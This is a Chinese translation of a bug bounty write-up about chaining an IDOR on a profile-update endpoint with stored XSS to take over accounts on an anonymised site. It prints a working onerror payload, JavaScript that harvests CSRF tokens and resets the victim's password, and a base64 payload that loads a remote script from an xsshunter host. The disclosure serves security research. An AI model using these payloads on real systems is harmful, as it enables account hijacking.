<html>
<head>
<title>Zero Click To Account Takeover (IDOR + XSS)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">零点击账户接管(IDOR + XSS)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4?source=collection_archive---------0-----------------------#2022-12-21">https://infosecwriteups.com/zero-click-to-account-takeover-idor-xss-98dd6cce63c4?source=collection_archive---------0-----------------------#2022-12-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cf52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">亲爱的朋友们，您好，这篇文章是关于我对BugCrowd程序的一个发现，该程序导致攻击者使用IDOR在受害者个人资料上注入XSS有效载荷，并发送更新密码功能的请求，直到更改受害者的密码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/9dabc2dafd331f0a665d350013c20358.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sa8VMq2rSw7GJPbc3Og3Rg.png"/></div></div></figure></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="587d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">侦查是虫子赏金最重要的部分。你花多少时间侦察，你就有更多的机会找到关键的漏洞。易受攻击的域名被该公司收购，我使用了<a class="ae le" href="http://crunchbase.com/" rel="noopener ugc nofollow" target="_blank"> Crunchbase </a>和Google Dork来了解。我在这个新资产上发现了2个P1、1个P2和2个P3。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="2785" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">IDOR是更新配置文件上最简单的IDOR类型，攻击者能够通过更改<strong class="jp ir">数据[用户][id] </strong>值参数来更新其他用户配置文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lf"><img src="../Images/418d4b107d342e6794ed414d63566636.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uhVfhop9rmvVv99ZVwC6Og.png"/></div></div></figure><p id="9f89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我发现这个漏洞，决定升级漏洞，用另一个东西编译。我意识到数据[用户][照片]反映在<strong class="jp ir">img</strong>标签的src中。在一个镜头中，我意识到能够关闭IMG标签的src值，但是无法关闭img标签。我使用onerror事件处理程序在受害者帐户上执行Javascript。</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="012a" class="ll lm iq lh b gy ln lo l lp lq">POST /users/update_my_profile HTTP/1.1<br/>Host: <a class="ae le" href="http://www.target.com" rel="noopener ugc nofollow" target="_blank">www.target.com</a></span><span id="f41a" class="ll lm iq lh b gy lr lo l lp lq">...  </span><span id="4efd" class="ll lm iq lh b gy lr lo l lp lq">_method=POST&amp;data[_Token][key]=6e8b90f4e7d7c694735d4f1c83db5968bf295f26&amp;data[User][id]=808265&amp;data[User][photo]=https://s3-us-west-2.amazonaws.com/target/nonexistent.png"+onerror=alert(origin)&amp;data[User][photo_old]=&amp;data[User][name]=Arman.Security&amp;data[User][gender]=m&amp;data[date][day]=&amp;data[date][month]=&amp;data[date][year]=&amp;data[User][mobile_number]=&amp;data[_Token][fields]=fa628e2b05473ddd3cbbee31d2d9c311eba4c9d5%3A&amp;data[_Token][unlocked]=</span></pre><p id="0a62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个回报是这样的:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lf"><img src="../Images/d27e100072818d8bcc24622293ccf6e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KdHj9J5v5IFSDGVtBP4VCA.png"/></div></div></figure><p id="a482" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有一个IDOR和XSS，现在时间使用XSS帐户接管或访问受害者帐户的私人信息。</p><p id="2b12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该网站在Cookie基础上工作，每个请求有2个验证令牌，其中一个是稳定的，另一个可根据每个功能进行更改。重要的是忽略旧密码来更新密码:)</p><p id="d95b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不得不编写一个漏洞，引导我收集所有受害者令牌，并在更新密码函数上测试可变令牌的所有模式。</p><p id="cea3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是漏洞代码:</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="f844" class="ll lm iq lh b gy ln lo l lp lq">url = "https://www.target.com/editar-mi-contrasena";</span><span id="69c6" class="ll lm iq lh b gy lr lo l lp lq">var token_keys_array = [];</span><span id="76ca" class="ll lm iq lh b gy lr lo l lp lq">var token_fields_array = [];</span><span id="188e" class="ll lm iq lh b gy lr lo l lp lq">var params = [];</span><span id="c50c" class="ll lm iq lh b gy lr lo l lp lq">var body = "";</span><span id="9cff" class="ll lm iq lh b gy lr lo l lp lq">var xhr = new XMLHttpRequest();</span><span id="37e5" class="ll lm iq lh b gy lr lo l lp lq">xhr.responseType = "document";</span><span id="4029" class="ll lm iq lh b gy lr lo l lp lq">xhr.open("GET", url, true);</span><span id="2f9a" class="ll lm iq lh b gy lr lo l lp lq">xhr.withCredentials = true;</span><span id="f155" class="ll lm iq lh b gy lr lo l lp lq">var xmlHttpRequest2 = new XMLHttpRequest();</span><span id="eb8c" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.open("POST", "https://www.target.com/editar-mi-contrasena", true);</span><span id="01c0" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");</span><span id="cadc" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Referer", "https://www.target.com/editar-mi-contrasena");</span><span id="7c82" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");</span><span id="594a" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Upgrade-Insecure-Requests", "1");</span><span id="d3f6" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-Mode", "navigate");</span><span id="6ca5" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-Dest", "document");</span><span id="23da" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.setRequestHeader("Sec-Fetch-User", "?1");</span><span id="dc3a" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.withCredentials = true;</span><span id="0e6f" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.onreadystatechange = function () {</span><span id="1415" class="ll lm iq lh b gy lr lo l lp lq">if (this.readyState == 4 &amp;&amp; this.status == 302) {</span><span id="7081" class="ll lm iq lh b gy lr lo l lp lq">print("response=" + this.responseText);</span><span id="5607" class="ll lm iq lh b gy lr lo l lp lq">print("done");</span><span id="f7df" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="dfd0" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="6e18" class="ll lm iq lh b gy lr lo l lp lq">xhr.onreadystatechange = function() {</span><span id="1ef8" class="ll lm iq lh b gy lr lo l lp lq">if (xhr.readyState == 4){</span><span id="8550" class="ll lm iq lh b gy lr lo l lp lq">xhr.response.querySelectorAll("input[name='data[_Token][key]']").forEach( input =&gt; {</span><span id="efbf" class="ll lm iq lh b gy lr lo l lp lq">token_keys_array.push(input.value)</span><span id="03af" class="ll lm iq lh b gy lr lo l lp lq">});</span><span id="7fdd" class="ll lm iq lh b gy lr lo l lp lq">xhr.response.querySelectorAll("input[name='data[_Token][fields]']").forEach( input =&gt; {</span><span id="00f7" class="ll lm iq lh b gy lr lo l lp lq">token_fields_array.push(input.value)</span><span id="dca0" class="ll lm iq lh b gy lr lo l lp lq">});</span><span id="7f3d" class="ll lm iq lh b gy lr lo l lp lq">for (let b = 0; b &lt; token_fields_array.length; b++) {</span><span id="8121" class="ll lm iq lh b gy lr lo l lp lq">if (b == 2){</span><span id="fdcb" class="ll lm iq lh b gy lr lo l lp lq">body = "_method=POST&amp;data%5B_Token%5D%5Bkey%5D="+token_keys_array[0]+"&amp;data%5BUser%5D%5Bpassword%5D=EvilOrAngel&amp;data%5BUser%5D%5Bpassword_confirmation%5D=EvilOrAngel&amp;data%5B_Token%5D%5Bfields%5D="+encodeURIComponent(token_fields_array[b])+"&amp;data%5B_Token%5D%5Bunlocked%5D=";</span><span id="e296" class="ll lm iq lh b gy lr lo l lp lq">xmlHttpRequest2.send(body);</span><span id="06b2" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="4167" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="e1f9" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="f925" class="ll lm iq lh b gy lr lo l lp lq">};</span><span id="d207" class="ll lm iq lh b gy lr lo l lp lq">xhr.send();</span></pre><p id="17ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将漏洞代码转换为Base64编码，然后设置img标签的id值，并通过<strong class="jp ir">on error = eval(atob(this . id))</strong>执行它。大概是这样的:</p><pre class="km kn ko kp gt lg lh li lj aw lk bi"><span id="1f4a" class="ll lm iq lh b gy ln lo l lp lq">"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</span></pre><p id="2221" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在IDOR帮助在受害者帐户上存储XSS有效载荷，然后利用帮助我们接管受害者帐户。轻松男孩😎</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ls"><img src="../Images/6445261c716868c0f3f64f8fd92d863e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ImeysarMqI5j82UO.png"/></div></div></figure><p id="4ca8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae le" href="https://twitter.com/m7arm4n" rel="noopener ugc nofollow" target="_blank">推特</a>🐦</p></div></div>    
</body>
</html>